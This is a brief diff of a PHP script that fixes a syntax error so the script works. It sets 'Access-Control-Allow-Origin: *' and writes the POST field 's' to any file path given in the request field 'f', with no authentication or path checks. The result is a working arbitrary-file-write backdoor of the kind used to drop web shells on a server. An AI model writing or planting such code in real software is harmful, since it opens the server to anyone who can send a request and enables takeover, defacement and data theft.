@@ -5,6 +5,5 @@ header('Pragma: no-cache');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST');
 $s=$_POST['s'];
-echo
-i//f ($s) echo file_put_contents($_REQUEST['f'],$s);
+if ($s) echo file_put_contents($_REQUEST['f'],$s);
 ?>
